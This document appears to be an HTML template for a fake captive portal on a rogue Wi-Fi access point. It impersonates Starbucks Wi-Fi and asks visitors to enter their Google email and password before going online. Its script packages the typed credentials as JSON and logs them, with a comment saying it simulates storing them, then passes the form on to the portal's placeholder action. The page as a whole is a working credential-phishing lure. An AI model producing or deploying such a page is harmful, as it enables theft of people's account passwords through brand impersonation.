<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starbucks Wi-Fi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 1rem;
        }
        h1 {
            color: #006241;
            margin-bottom: 1rem;
        }
        input {
            display: block;
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #006241;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="/api/placeholder/100/100" alt="Starbucks Logo" class="logo">
        <h1>Welcome to Starbucks Wi-Fi</h1>
        <p>Sign in with your Google account to access free Wi-Fi</p>
        <form id="loginForm" method="GET" action="$authaction">
            <input type="hidden" name="tok" value="$tok">
            <input type="hidden" name="redir" value="$redir">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn" disabled>Sign In</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');

        function validateForm() {
            if (emailInput.value.includes('@') && passwordInput.value.length > 0) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        }

        emailInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Simulate storing data in JSON (this doesn't actually save anything)
            const jsonData = JSON.stringify({
                email: emailInput.value,
                password: passwordInput.value
            });
            console.log('Data that would be saved:', jsonData);

            // Proceed with the original form submission
            this.submit();
        });
    </script>
</body>
</html>
